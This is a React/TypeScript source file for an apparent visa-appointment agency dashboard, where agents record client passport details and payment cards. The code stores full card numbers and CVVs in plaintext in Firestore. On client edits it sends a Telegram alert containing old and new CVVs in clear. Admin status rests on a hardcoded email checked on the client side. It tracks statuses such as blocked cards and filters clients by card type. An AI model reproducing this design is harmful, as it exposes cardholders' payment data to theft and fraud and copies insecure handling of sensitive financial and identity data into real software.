
import React, { useState, useEffect, useCallback, useMemo, useRef } from 'react';
import { Language, Theme, Client, ClientFormData } from './types';
import { TRANSLATIONS, PAYMENT_STATUSES, PAYMENT_STATUS_LABELS } from './constants';
import Navbar from './components/Navbar';
import ClientForm from './components/ClientForm';
import ClientTable from './components/ClientTable';
import Auth from './components/Auth';
import { maskCard, getCardType, sendTelegramAlert } from './utils/helpers';
import { auth, db } from './lib/firebase';
import { onAuthStateChanged, signOut, User as FirebaseUser } from 'firebase/auth';
import { collection, query as fireQuery, where, orderBy, getDocs, addDoc, updateDoc, deleteDoc, doc, getDoc, setDoc } from 'firebase/firestore';
import { Users, Plus, LayoutGrid, Filter, CheckCircle2, Trash2, ShieldAlert, UserCheck, Layers, CheckSquare, Square, RefreshCw, X, CreditCard, ClipboardCopy } from 'lucide-react';

interface Agent {
  id: string;
  email: string;
}

const App: React.FC = () => {
  const [lang, setLang] = useState<Language>(() => {
    const stored = localStorage.getItem('lang');
    return (stored === 'en' || stored === 'fr' || stored === 'ar') ? stored as Language : 'en';
  });
  
  const [theme, setTheme] = useState<Theme>(() => {
    const stored = localStorage.getItem('theme');
    return (stored === 'light' || stored === 'dark') ? stored as Theme : 'light';
  });

  const [session, setSession] = useState<any>(null);
  const [isLoadingSession, setIsLoadingSession] = useState(true);
  const [clients, setClients] = useState<Client[]>([]);
  const [agents, setAgents] = useState<Agent[]>([]);
  const [isFetchingClients, setIsFetchingClients] = useState(false);
  const [editingClient, setEditingClient] = useState<Client | null>(null);
  const [copyingClient, setCopyingClient] = useState<Partial<ClientFormData> | null>(null);
  const [isFormOpen, setIsFormOpen] = useState(false);
  
  const [selectedUserIds, setSelectedUserIds] = useState<string[]>([]);
  const [selectedClientIds, setSelectedClientIds] = useState<string[]>([]);
  const [isBulkMode, setIsBulkMode] = useState(false);
  const [filterPaymentStatus, setFilterPaymentStatus] = useState<string>('');
  const [filterCardType, setFilterCardType] = useState<string>('');

  const initialFetchDone = useRef(false);
  const isAdmin = useMemo(() => session?.user?.email === 'admin@mkservice.com', [session]);

  useEffect(() => {
    const unsubscribe = onAuthStateChanged(auth, async (firebaseUser) => {
      setSession(firebaseUser ? { user: firebaseUser } : null);
      if (firebaseUser && firebaseUser.email !== 'admin@mkservice.com') {
        setIsFormOpen(true);
        // Auto-create users collection doc for existing agents (backfill)
        const userRef = doc(db, 'users', firebaseUser.uid);
        const userSnap = await getDoc(userRef);
        if (!userSnap.exists()) {
          await setDoc(userRef, {
            email: firebaseUser.email,
            createdAt: new Date().toISOString()
          });
        }
      }
      setIsLoadingSession(false);
    });
    return unsubscribe;
  }, []);

  useEffect(() => {
    localStorage.setItem('lang', lang);
    document.documentElement.dir = lang === 'ar' ? 'rtl' : 'ltr';
    document.documentElement.lang = lang;
  }, [lang]);

  useEffect(() => {
    localStorage.setItem('theme', theme);
    if (theme === 'dark') {
      document.documentElement.classList.add('dark');
    } else {
      document.documentElement.classList.remove('dark');
    }
  }, [theme]);

  const mapFromDB = (dbItem: any): Client => ({
    id: dbItem.id,
    lastName: dbItem.last_name,
    firstName: dbItem.first_name,
    phoneNumber: dbItem.phone_number,
    dob: dbItem.dob,
    passportNumber: dbItem.passport_number,
    previousVisaNumber: dbItem.previous_visa_number,
    visaFrom: dbItem.visa_from,
    visaTo: dbItem.visa_to,
    category: dbItem.category,
    appointmentDate: dbItem.appointment_date,
    photoUrl: dbItem.photo_url,
    createdAt: dbItem.created_at,
    updatedAt: dbItem.updated_at || dbItem.created_at,
    isModified: !!dbItem.is_modified,
    user_id: dbItem.user_id,
    type: dbItem.type || 'indv',
    issueDate: dbItem.issue_date,
    expiryDate: dbItem.expiry_date,
    placeOfIssue: dbItem.place_of_issue,
    payment: dbItem.payment || { cardMask: 'N/A', expiryDate: '', cardHolderName: '', cardNumber: '', cvv: '', cardType: '', paymentStatus: '' }
  });

  const fetchAgents = useCallback(async () => {
    if (!isAdmin) return;
    try {
      const snapshot = await getDocs(collection(db, 'users'));
      const data = snapshot.docs.map(d => ({ id: d.id, email: d.data().email } as Agent));
      setAgents(data);
    } catch (err) {
      console.error('Failed to fetch agents:', err);
    }
  }, [isAdmin]);

  const fetchClients = useCallback(async (isManual = false) => {
    if (!session?.user) return;
    
    // If not a manual refresh and we already fetched once, skip to avoid "refreshing on tab leave"
    if (!isManual && initialFetchDone.current) return;

    setIsFetchingClients(true);
    try {
      let q;
      if (isAdmin) {
        q = fireQuery(collection(db, 'clients'));
      } else {
        q = fireQuery(collection(db, 'clients'), where('user_id', '==', session.user.uid));
      }
      const snapshot = await getDocs(q);
      const data = snapshot.docs.map(d => {
        const docData = d.data() as Record<string, any>;
        const { id: _supabaseId, ...rest } = docData;
        return { id: d.id, ...rest };
      });
      const sorted = (data as any[]).sort((a, b) => {
        const dateA = a.created_at || '';
        const dateB = b.created_at || '';
        return dateB.localeCompare(dateA);
      });
      setClients(sorted.map(mapFromDB));
      initialFetchDone.current = true;
    } catch (err) {
      console.error('Error fetching clients:', err);
    } finally {
      setIsFetchingClients(false);
    }
  }, [session, isAdmin]);

  useEffect(() => {
    if (session?.user) {
      fetchClients(false);
      if (isAdmin) fetchAgents();
    }
  }, [session, fetchClients, fetchAgents, isAdmin]);

  const agentMetrics = useMemo(() => {
    const counts: Record<string, number> = {};
    clients.forEach(c => {
      if (c.user_id) counts[c.user_id] = (counts[c.user_id] || 0) + 1;
    });
    return counts;
  }, [clients]);

  const filteredClients = useMemo(() => {
    let result = clients;
    if (isAdmin && selectedUserIds.length > 0) {
      result = result.filter(c => c.user_id && selectedUserIds.includes(c.user_id));
    }
    if (filterPaymentStatus) {
      result = result.filter(c => c.payment?.paymentStatus === filterPaymentStatus);
    }
    if (filterCardType) {
      result = result.filter(c => getCardType(c.payment?.cardNumber || '') === filterCardType);
    }
    return result;
  }, [clients, selectedUserIds, isAdmin, filterPaymentStatus, filterCardType]);

  const handleLogout = async () => {
    initialFetchDone.current = false;
    await signOut(auth);
  };

  const handleRegisterClient = async (formData: ClientFormData) => {
    const t = TRANSLATIONS[lang];
    if (!session?.user) return;
    try {
      const payload = {
        user_id: session.user.uid,
        last_name: formData.lastName.toUpperCase(),
        first_name: formData.firstName.toUpperCase(),
        phone_number: formData.phoneNumber,
        dob: formData.dob,
        passport_number: formData.passportNumber.toUpperCase(),
        issue_date: formData.issueDate,
        expiry_date: formData.expiryDate,
        place_of_issue: formData.placeOfIssue.toUpperCase(),
        previous_visa_number: formData.previousVisaNumber,
        visa_from: formData.visaFrom,
        visa_to: formData.visaTo,
        category: formData.category,
        appointment_date: formData.appointmentDate,
        photo_url: formData.photoUrl,
        type: formData.type,
        is_modified: false,
        created_at: new Date().toISOString(),
        updated_at: new Date().toISOString(),
        payment: {
          cardMask: formData.payment.cardNumber ? maskCard(formData.payment.cardNumber) : 'N/A',
          expiryDate: formData.payment.expiryDate,
          cardHolderName: formData.payment.cardHolderName.toUpperCase(),
          cardNumber: formData.payment.cardNumber,
          cvv: formData.payment.cvv,
          cardType: getCardType(formData.payment.cardNumber) || '',
          paymentStatus: formData.payment.paymentStatus || ''
        }
      };
      const docRef = await addDoc(collection(db, 'clients'), payload);
      setClients(prev => [mapFromDB({ id: docRef.id, ...payload }), ...prev]);
    } catch (err: any) {
      alert(`${t.registrationFailed}: ${err.message}`);
      throw err;
    }
  };

  const handleUpdateClient = async (id: string, formData: ClientFormData) => {
    const t = TRANSLATIONS[lang];
    if (!session?.user) return;
    const oldClient = editingClient;
    try {
      const payload = {
        last_name: formData.lastName.toUpperCase(),
        first_name: formData.firstName.toUpperCase(),
        phone_number: formData.phoneNumber,
        dob: formData.dob,
        passport_number: formData.passportNumber.toUpperCase(),
        issue_date: formData.issueDate,
        expiry_date: formData.expiryDate,
        place_of_issue: formData.placeOfIssue.toUpperCase(),
        previous_visa_number: formData.previousVisaNumber,
        visa_from: formData.visaFrom,
        visa_to: formData.visaTo,
        category: formData.category,
        appointment_date: formData.appointmentDate,
        photo_url: formData.photoUrl,
        type: formData.type,
        is_modified: true, 
        updated_at: new Date().toISOString(),
        payment: {
          cardMask: formData.payment.cardNumber ? maskCard(formData.payment.cardNumber) : 'N/A',
          expiryDate: formData.payment.expiryDate,
          cardHolderName: formData.payment.cardHolderName.toUpperCase(),
          cardNumber: formData.payment.cardNumber,
          cvv: formData.payment.cvv,
          cardType: getCardType(formData.payment.cardNumber) || '',
          paymentStatus: formData.payment.paymentStatus || ''
        }
      };
      await updateDoc(doc(db, 'clients', id), payload);
      if (oldClient && !isAdmin) {
        const agentName = session.user.email?.split('@')[0] || session.user.email;
        const clientName = `${formData.lastName} ${formData.firstName}`.trim();
        const changes: string[] = [];
        const paymentChanges: string[] = [];
        const fields: [keyof ClientFormData, string][] = [
          ['lastName', 'Nom'], ['firstName', 'Prénom'], ['phoneNumber', 'Tél'],
          ['dob', 'DN'], ['passportNumber', 'Passeport'], ['issueDate', 'Délivrance'],
          ['expiryDate', 'Expiration'], ['placeOfIssue', 'Lieu'], ['category', 'Catégorie'],
          ['appointmentDate', 'RDV'], ['previousVisaNumber', 'Visa préc.']
        ];
        for (const [key, label] of fields) {
          const oldVal = (oldClient as any)[key] || '';
          const newVal = (formData as any)[key] || '';
          if (oldVal !== newVal) changes.push(`⚡ <b>${label}:</b> ${oldVal} → ${newVal}`);
        }
        const pOld = oldClient.payment;
        const pNew = formData.payment;
        let paymentChanged = false;
        if (pOld?.cardNumber !== pNew.cardNumber) { paymentChanges.push(`⚡ <b>Numéro de Carte:</b> ${maskCard(pNew.cardNumber || '')}`); paymentChanged = true; }
        if (pOld?.cardHolderName !== pNew.cardHolderName) { paymentChanges.push(`⚡ <b>Titulaire:</b> ${pNew.cardHolderName}`); paymentChanged = true; }
        if (pOld?.expiryDate !== pNew.expiryDate) { paymentChanges.push(`⚡ <b>Date d'Expiration:</b> ${pOld?.expiryDate || '-'} → ${pNew.expiryDate}`); paymentChanged = true; }
        if (pOld?.cvv !== pNew.cvv) { paymentChanges.push(`⚡ <b>CVV:</b> ${pOld?.cvv || '-'} → ${pNew.cvv}`); paymentChanged = true; }
        if (pOld?.paymentStatus !== pNew.paymentStatus) { paymentChanges.push(`🛑 <b>Statut:</b> ${pOld?.paymentStatus || '-'} → ${pNew.paymentStatus}`); paymentChanged = true; }

        let msg = `⚠️ <b>MODIFICATION EFFECTUÉE</b>\n🛑 <b>Agence:</b> ${agentName}\n🛑 <b>Client:</b> ${clientName} (${formData.passportNumber})`;
        if (changes.length > 0) msg += '\n' + changes.join('\n');
        if (paymentChanged) msg += '\n💳 <b>Détails du Paiement (Modifiés):</b>\n' + paymentChanges.join('\n');
        sendTelegramAlert(msg);
      }
      setClients(prev => prev.map(c => c.id === id ? mapFromDB({ id, ...payload, created_at: c.createdAt }) : c));
      setEditingClient(null);
    } catch (err: any) {
      alert(`${t.updateFailed}: ${err.message}`);
      throw err;
    }
  };

  const handleConfirmModification = async (id: string) => {
    try {
      await updateDoc(doc(db, 'clients', id), { is_modified: false });
      setClients(prev => prev.map(c => c.id === id ? { ...c, isModified: false } : c));
    } catch (err) {
      console.error('Failed to confirm modification review:', err);
    }
  };

  const handleUpdateClientType = async (id: string, type: string) => {
    try {
      await updateDoc(doc(db, 'clients', id), { type });
      setClients(prev => prev.map(c => c.id === id ? { ...c, type } : c));
    } catch (err) {
      console.error('Failed to update client type:', err);
    }
  };

  const handleDeleteClient = async (id: string) => {
    if (!window.confirm(TRANSLATIONS[lang].confirmDelete)) return;
    const deletedClient = clients.find(c => c.id === id);
    try {
      await deleteDoc(doc(db, 'clients', id));
      if (deletedClient && !isAdmin) {
        const agentName = session?.user?.email?.split('@')[0] || session?.user?.email;
        const clientName = `${deletedClient.lastName} ${deletedClient.firstName}`.trim();
        const msg = `🚨 <b>SUPPRESSION EFFECTUÉE</b>\n🛑 <b>Agence:</b> ${agentName}\n🛑 <b>Client:</b> ${clientName} (${deletedClient.passportNumber})\n🛑 <b>Statut:</b> ${deletedClient.payment?.paymentStatus || '-'}`;
        sendTelegramAlert(msg);
      }
      setClients(prev => prev.filter(c => c.id !== id));
      setSelectedClientIds(prev => prev.filter(cid => cid !== id));
    } catch (err: any) {
      console.error('Delete failed:', err);
      alert(`${TRANSLATIONS[lang].updateFailed}: ${err.message}`);
    }
  };

  const handleBulkDelete = async () => {
    if (selectedClientIds.length === 0) return;
    const count = selectedClientIds.length;
    if (!window.confirm(TRANSLATIONS[lang].confirmBulkDelete.replace('{count}', count.toString()))) return;
    try {
      await Promise.all(selectedClientIds.map(id => deleteDoc(doc(db, 'clients', id))));
      setClients(prev => prev.filter(c => !selectedClientIds.includes(c.id)));
      setSelectedClientIds([]);
    } catch (err: any) {
      console.error('Batch deletion failed:', err);
      alert(`${TRANSLATIONS[lang].updateFailed}: ${err.message}`);
    }
  };

  const toggleClientSelection = (id: string) => {
    setSelectedClientIds(prev => prev.includes(id) ? prev.filter(i => i !== id) : [...prev, id]);
  };

  const handleCopyAgentClients = (agentId: string) => {
    const agent = agents.find(a => a.id === agentId);
    const agentClients = clients.filter(c => c.user_id === agentId);

    const groupedByStatus: Record<string, Record<string, Client[]>> = {};
    agentClients.forEach(c => {
      const status = c.payment?.paymentStatus || 'unknown';
      const key = `${c.category}_${c.type || 'indv'}`;
      if (!groupedByStatus[status]) groupedByStatus[status] = {};
      if (!groupedByStatus[status][key]) groupedByStatus[status][key] = [];
      groupedByStatus[status][key].push(c);
    });

    let text = `📋 Copie des clients - ${agent?.email?.split('@')[0] || agentId}\n`;
    text += `═`.repeat(40) + '\n\n';

    const sortedStatuses = Object.keys(groupedByStatus).sort();
    sortedStatuses.forEach(status => {
      const statusLabel = (PAYMENT_STATUS_LABELS[status] as any)?.[lang] || status;
      text += `🔹 ${statusLabel}\n`;
      text += `─`.repeat(30) + '\n';
      const cats = groupedByStatus[status];
      const sortedKeys = Object.keys(cats).sort();
      sortedKeys.forEach(key => {
        const [cat, type] = key.split('_');
        const hasBothTypes = sortedKeys.some(k => k.startsWith(cat + '_') && k !== key);
        const label = hasBothTypes ? `${cat} ${type === 'famille' ? 'FAMILLE' : 'INDV'} :` : `${cat} :`;
        text += `${label}\n`;
        cats[key].forEach(client => {
          text += `   ${client.lastName} ${client.firstName}\n`;
        });
      });
      text += '\n';
    });

    navigator.clipboard.writeText(text).then(() => {
      alert(`✅ Copié: ${agentClients.length} client(s) pour ${agent?.email?.split('@')[0] || agentId}`);
    }).catch(() => {
      alert('❌ Échec de la copie');
    });
  };

  const handleAgentClick = (agentId: string) => {
    if (isBulkMode) {
      setSelectedUserIds(prev => prev.includes(agentId) ? prev.filter(id => id !== agentId) : [...prev, agentId]);
    } else {
      setSelectedUserIds(prev => (prev.length === 1 && prev[0] === agentId) ? [] : [agentId]);
    }
  };

  const t = TRANSLATIONS[lang];

  if (isLoadingSession) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-slate-50 dark:bg-slate-900">
        <div className="w-12 h-12 border-4 border-indigo-600 border-t-transparent rounded-full animate-spin"></div>
      </div>
    );
  }

  if (!session) return <Auth lang={lang} t={t} theme={theme} setTheme={setTheme} setLang={setLang} />;

  return (
    <div className={`min-h-screen ${isAdmin ? 'bg-slate-100 dark:bg-[#0a0f1c]' : 'bg-slate-50 dark:bg-slate-900'} text-slate-900 dark:text-slate-100 pb-32 transition-colors duration-200`}>
      <Navbar lang={lang} setLang={setLang} theme={theme} setTheme={setTheme} t={t} onLogout={handleLogout} userEmail={session.user.email || ''} />
      
      <main className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 mt-8 space-y-8">
        
        {isAdmin && (
          <section className="bg-white dark:bg-slate-800 p-8 rounded-[40px] shadow-2xl border border-blue-100 dark:border-blue-900/20 relative group overflow-hidden">
            <div className="absolute top-0 right-0 w-64 h-64 bg-indigo-500/5 rounded-full -mr-32 -mt-32 blur-3xl group-hover:scale-110 transition-all duration-1000"></div>
            <div className="flex flex-col md:flex-row md:items-center justify-between mb-8 relative z-10 gap-4">
              <div className="flex items-center gap-5">
                <div className="p-4 bg-indigo-600 text-white rounded-[24px] shadow-xl shadow-indigo-500/30 ring-4 ring-indigo-500/10">
                  <Users className="w-7 h-7" />
                </div>
                <div>
                  <h3 className="font-black uppercase tracking-tighter text-slate-900 dark:text-white text-2xl">{t.activeAgentsNetwork}</h3>
                  <div className="flex items-center gap-3 mt-1.5">
                    <p className="text-[10px] font-black text-slate-400 uppercase tracking-widest flex items-center gap-2">
                      <UserCheck className="w-3.5 h-3.5" /> {agents.length} {t.nodesSynchronized}
                    </p>
                    <button onClick={() => fetchClients(true)} className="flex items-center gap-1 text-[9px] font-black text-indigo-500 uppercase tracking-widest hover:text-indigo-600 transition-colors">
                      <RefreshCw className={`w-3 h-3 ${isFetchingClients ? 'animate-spin' : ''}`} /> {t.forceSync}
                    </button>
                  </div>
                </div>
              </div>
              <div className="flex items-center gap-3 bg-slate-50 dark:bg-slate-900 p-2 rounded-2xl border border-slate-200 dark:border-slate-700 shadow-inner">
                 <button 
                  onClick={() => { setIsBulkMode(!isBulkMode); if(isBulkMode) setSelectedUserIds(prev => prev.slice(0,1)); }}
                  className={`flex items-center gap-2 px-4 py-2 rounded-xl text-[10px] font-black uppercase transition-all ${isBulkMode ? 'bg-indigo-600 text-white shadow-lg' : 'text-slate-500 hover:bg-slate-200 dark:hover:bg-slate-800'}`}
                 >
                   <Layers className="w-3.5 h-3.5" />
                   {t.bulkSelect} {isBulkMode ? t.on : t.off}
                 </button>
              </div>
            </div>
            
            <div className="flex items-center gap-5 overflow-x-auto pb-6 scrollbar-hide no-scrollbar relative z-10 px-2">
              <button onClick={() => setSelectedUserIds([])} className={`flex-shrink-0 px-10 py-5 rounded-3xl font-black text-xs uppercase transition-all flex items-center gap-4 border-4 ${selectedUserIds.length === 0 ? 'bg-indigo-600 text-white border-indigo-400 shadow-[0_20px_40px_rgba(79,70,229,0.3)] scale-105' : 'bg-slate-50 dark:bg-slate-900 text-slate-500 border-transparent hover:border-slate-300 dark:hover:border-slate-700'}`}>
                <div className="p-2 bg-white/10 rounded-xl"><LayoutGrid className="w-6 h-6" /></div>
                <div className="flex flex-col items-start leading-none"><span>{t.globalPool}</span><span className="text-[8px] mt-1 opacity-60">{t.allRegisteredData}</span></div>
                <span className={`px-2 py-1 rounded-lg text-[10px] ${selectedUserIds.length === 0 ? 'bg-white/20 text-white' : 'bg-slate-200 dark:bg-slate-800 text-slate-600'}`}>{clients.length}</span>
              </button>
              {agents.map((agent) => (
                <div key={agent.id} className="flex-shrink-0 flex items-center gap-2">
                  <button onClick={() => handleAgentClick(agent.id)} className={`px-10 py-5 rounded-3xl font-black text-xs uppercase transition-all flex items-center gap-4 border-4 ${selectedUserIds.includes(agent.id) ? 'bg-blue-600 text-white border-blue-400 shadow-[0_20px_40px_rgba(37,99,235,0.3)] scale-105' : 'bg-slate-50 dark:bg-slate-900 text-slate-500 border-transparent hover:border-slate-300 dark:hover:border-slate-700'}`}>
                    <div className={`w-3.5 h-3.5 rounded-full ${selectedUserIds.includes(agent.id) ? 'bg-white animate-pulse' : (agentMetrics[agent.id] || 0) > 0 ? 'bg-emerald-500' : 'bg-slate-400'}`}></div>
                    <div className="flex flex-col items-start leading-none"><span>{agent.email.split('@')[0]}</span><span className="text-[8px] mt-1 opacity-60">{agent.email.split('@')[1]}</span></div>
                    <span className={`px-2 py-1 rounded-lg text-[10px] ${selectedUserIds.includes(agent.id) ? 'bg-white/20 text-white' : 'bg-slate-200 dark:bg-slate-800 text-slate-600'}`}>{agentMetrics[agent.id] || 0}</span>
                  </button>
                  <button
                    onClick={() => handleCopyAgentClients(agent.id)}
                    className="p-3 rounded-2xl bg-emerald-50 dark:bg-emerald-900/30 text-emerald-600 hover:bg-emerald-600 hover:text-white transition-all shadow-sm border border-emerald-200 dark:border-emerald-800/30"
                    title="Copier tous les clients"
                  >
                    <ClipboardCopy className="w-4 h-4" />
                  </button>
                </div>
              ))}
            </div>
          </section>
        )}

        <section className="space-y-4">
          <div className="flex items-center justify-between bg-white dark:bg-slate-800 p-6 rounded-[32px] shadow-xl border border-slate-200 dark:border-slate-700">
             <div className="flex items-center gap-5">
               <div className={`p-4 rounded-[22px] ${isAdmin ? 'bg-indigo-100 dark:bg-indigo-900/30 text-indigo-600' : 'bg-blue-100 dark:bg-blue-900/30 text-blue-600'} shadow-lg`}><Plus className="w-8 h-8" /></div>
               <div><h2 className="text-2xl font-black uppercase tracking-tighter text-slate-900 dark:text-white leading-none">{t.addNewClient}</h2><p className="text-[10px] font-black text-slate-400 uppercase tracking-[0.3em] mt-2.5">{t.dataEntryNode}</p></div>
             </div>
             <button onClick={() => setIsFormOpen(!isFormOpen)} className={`px-12 py-4 rounded-2xl font-black uppercase text-xs tracking-widest transition-all border-b-4 active:border-b-0 active:translate-y-1 ${isFormOpen ? 'bg-slate-200 dark:bg-slate-700 text-slate-700 dark:text-slate-300 border-slate-300 dark:border-slate-600' : 'bg-indigo-600 text-white border-indigo-800 hover:bg-indigo-700 shadow-2xl'}`}>
               {isFormOpen ? t.deactivateTerminal : t.activateTerminal}
             </button>
          </div>
          {isFormOpen && <div className="animate-in slide-in-from-top-6 fade-in duration-500 ease-out"><ClientForm key={copyingClient ? 'copy' : 'new'} lang={lang} t={t} onSubmit={handleRegisterClient} initialData={copyingClient || undefined} onCancel={() => { setIsFormOpen(false); setCopyingClient(null); }} /></div>}
        </section>

        <section className="space-y-6">
          <div className="flex flex-col md:flex-row items-start md:items-center justify-between gap-5 px-3">
            <div className="flex items-center gap-5">
                <h2 className="text-4xl font-black uppercase tracking-tighter text-slate-900 dark:text-white">{t.registeredClients}</h2>
                {isFetchingClients && <div className="w-7 h-7 border-[5px] border-indigo-600 border-t-transparent rounded-full animate-spin"></div>}
                <button 
                  onClick={() => fetchClients(true)} 
                  className="p-2 rounded-xl bg-slate-100 dark:bg-slate-800 text-slate-500 hover:text-indigo-600 transition-all shadow-sm border border-slate-200 dark:border-slate-700"
                  title={t.refresh}
                >
                  <RefreshCw className={`w-4 h-4 ${isFetchingClients ? 'animate-spin' : ''}`} />
                </button>
            </div>
            {isAdmin && selectedUserIds.length > 0 && <div className="flex items-center gap-4 bg-indigo-600 text-white px-8 py-3 rounded-2xl text-[11px] font-black uppercase shadow-2xl border border-indigo-400 animate-in slide-in-from-right duration-500"><Filter className="w-5 h-5" />{t.aggregatedView}: {selectedUserIds.length} {t.nodesSelected}</div>}
          </div>
          {/* Filter Bar */}
          <div className="flex flex-wrap items-center gap-4 px-3">
            <div className="flex items-center gap-2">
              <span className="text-[10px] font-black text-slate-400 uppercase tracking-widest">{t.paymentStatus}:</span>
              <button onClick={() => setFilterPaymentStatus('')} className={`px-3 py-1.5 rounded-lg text-[10px] font-black uppercase transition-all ${!filterPaymentStatus ? 'bg-indigo-600 text-white shadow' : 'bg-slate-100 dark:bg-slate-800 text-slate-500 hover:bg-slate-200 dark:hover:bg-slate-700'}`}>{t.all}</button>
              {PAYMENT_STATUSES.map(s => (
                <button key={s} onClick={() => setFilterPaymentStatus(filterPaymentStatus === s ? '' : s)} className={`px-3 py-1.5 rounded-lg text-[10px] font-black uppercase transition-all flex items-center gap-1.5 ${filterPaymentStatus === s ? 'bg-indigo-600 text-white shadow' : 'bg-slate-100 dark:bg-slate-800 text-slate-500 hover:bg-slate-200 dark:hover:bg-slate-700'}`}>
                  <span className="text-xs">{s === 'ydjouz' ? '🟢' : s === 'en_attente' ? '🔴' : s === 'carte_bloquee' ? '🟠' : '⚫'}</span>
                  {(PAYMENT_STATUS_LABELS[s] as any)[lang]}
                </button>
              ))}
            </div>
            <div className="w-px h-6 bg-slate-300 dark:bg-slate-600"></div>
            <div className="flex items-center gap-2">
              <span className="text-[10px] font-black text-slate-400 uppercase tracking-widest"><CreditCard className="w-3 h-3 inline mr-1" />{t.cardType}:</span>
              <button onClick={() => setFilterCardType('')} className={`px-3 py-1.5 rounded-lg text-[10px] font-black uppercase transition-all ${!filterCardType ? 'bg-indigo-600 text-white shadow' : 'bg-slate-100 dark:bg-slate-800 text-slate-500 hover:bg-slate-200 dark:hover:bg-slate-700'}`}>{t.all}</button>
              <button onClick={() => setFilterCardType(filterCardType === 'CIB' ? '' : 'CIB')} className={`px-3 py-1.5 rounded-lg text-[10px] font-black uppercase transition-all flex items-center gap-1.5 ${filterCardType === 'CIB' ? 'bg-indigo-600 text-white shadow' : 'bg-slate-100 dark:bg-slate-800 text-slate-500 hover:bg-slate-200 dark:hover:bg-slate-700'}`}>
                <img src="https://i.ibb.co/wr8Bjm20/cib.jpg" alt="" className="w-4 h-4 rounded object-contain" /> CIB
              </button>
              <button onClick={() => setFilterCardType(filterCardType === 'EDAHABIA' ? '' : 'EDAHABIA')} className={`px-3 py-1.5 rounded-lg text-[10px] font-black uppercase transition-all flex items-center gap-1.5 ${filterCardType === 'EDAHABIA' ? 'bg-indigo-600 text-white shadow' : 'bg-slate-100 dark:bg-slate-800 text-slate-500 hover:bg-slate-200 dark:hover:bg-slate-700'}`}>
                <img src="https://i.ibb.co/svrGq7Dh/edahabia.jpg" alt="" className="w-4 h-4 rounded object-contain" /> EDAHABIA
              </button>
            </div>
            {(filterPaymentStatus || filterCardType) && (
              <button onClick={() => { setFilterPaymentStatus(''); setFilterCardType(''); }} className="text-[10px] font-black text-red-500 hover:text-red-600 uppercase tracking-widest flex items-center gap-1 ml-auto">
                <X className="w-3 h-3" /> {t.clearFilters}
              </button>
            )}
          </div>
          <ClientTable 
            clients={filteredClients} 
            t={t} 
            lang={lang} 
            isAdmin={isAdmin}
            onEdit={setEditingClient} 
            onDelete={handleDeleteClient} 
            onConfirmModification={handleConfirmModification}
            onCopy={(c) => { setCopyingClient(c); setIsFormOpen(true); window.scrollTo({ top: 0, behavior: 'smooth' }); }}
            onUpdateType={handleUpdateClientType}
            isFetching={isFetchingClients}
            selectedClientIds={selectedClientIds}
            onToggleClientSelect={toggleClientSelection}
            onSelectAllVisible={(ids) => setSelectedClientIds(ids)}
          />
        </section>
      </main>

      {/* Glassmorphic Bulk Action Bar */}
      {selectedClientIds.length > 0 && (
        <div className="fixed bottom-10 left-1/2 -translate-x-1/2 z-50 animate-in slide-in-from-bottom-20 duration-500 w-full max-w-2xl px-6">
          <div className="bg-slate-900/90 dark:bg-slate-800/95 backdrop-blur-2xl px-10 py-6 rounded-[40px] shadow-[0_25px_80px_rgba(0,0,0,0.6)] border border-white/10 flex items-center justify-between">
            <div className="flex items-center gap-6">
              <div className="w-16 h-16 rounded-3xl bg-indigo-600 flex items-center justify-center text-white font-black text-2xl shadow-xl shadow-indigo-500/30 animate-pulse">
                {selectedClientIds.length}
              </div>
              <div className="flex flex-col">
                <span className="text-white font-black uppercase tracking-widest text-sm">{t.nodesSelected}</span>
                <button onClick={() => setSelectedClientIds([])} className="text-indigo-400 hover:text-white text-[11px] font-black uppercase tracking-widest flex items-center gap-1.5 transition-colors mt-1">
                  <X className="w-3.5 h-3.5" /> {t.deselectAll}
                </button>
              </div>
            </div>
            <button onClick={handleBulkDelete} className="px-12 py-4 bg-red-600 hover:bg-red-700 text-white rounded-2xl font-black uppercase text-xs tracking-[0.2em] shadow-xl shadow-red-600/30 transition-all flex items-center gap-4 active:scale-95 group">
              <Trash2 className="w-5 h-5 group-hover:rotate-12 transition-transform" />
              {t.deleteSelected}
            </button>
          </div>
        </div>
      )}

      {editingClient && (
        <div className="fixed inset-0 z-50 flex items-center justify-center p-6 bg-slate-900/98 backdrop-blur-3xl animate-in fade-in duration-500">
          <div className="bg-white dark:bg-slate-800 rounded-[64px] shadow-[0_40px_150px_rgba(0,0,0,0.8)] w-full max-w-6xl max-h-[94vh] overflow-hidden border border-white/20">
            <div className="p-12 border-b border-slate-100 dark:border-slate-700/50 flex justify-between items-center bg-slate-50/50 dark:bg-slate-900/40">
              <div className="flex items-center gap-6">
                <div className="p-5 bg-indigo-600/10 dark:bg-indigo-400/10 rounded-[32px]"><ShieldAlert className="w-10 h-10 text-indigo-600 dark:text-indigo-400" /></div>
                <div><h3 className="text-4xl font-black uppercase tracking-tighter text-slate-900 dark:text-white">{t.secureEditEngine}</h3><p className="text-[11px] font-black text-slate-500 uppercase tracking-[0.4em] mt-2">{t.fileAccessGranted}: {editingClient.passportNumber}</p></div>
              </div>
              <button onClick={() => setEditingClient(null)} className="w-16 h-16 rounded-[28px] bg-slate-200 dark:bg-slate-700 flex items-center justify-center text-slate-600 hover:rotate-180 transition-all font-black text-2xl hover:bg-red-500 hover:text-white shadow-lg">✕</button>
            </div>
            <div className="p-12 overflow-y-auto max-h-[calc(94vh-180px)] custom-scrollbar">
              <ClientForm lang={lang} t={t} onSubmit={(data) => handleUpdateClient(editingClient.id, data)} initialData={editingClient} onCancel={() => setEditingClient(null)} />
            </div>
          </div>
        </div>
      )}
    </div>
  );
};

export default App;
